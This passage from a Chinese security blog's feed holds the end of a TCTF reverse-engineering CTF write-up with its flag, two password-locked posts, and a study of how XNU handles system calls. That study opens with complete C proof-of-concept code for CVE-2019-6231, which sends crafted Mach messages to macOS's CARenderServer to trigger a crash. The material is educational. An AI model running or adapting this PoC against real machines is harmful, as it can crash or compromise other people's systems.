6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
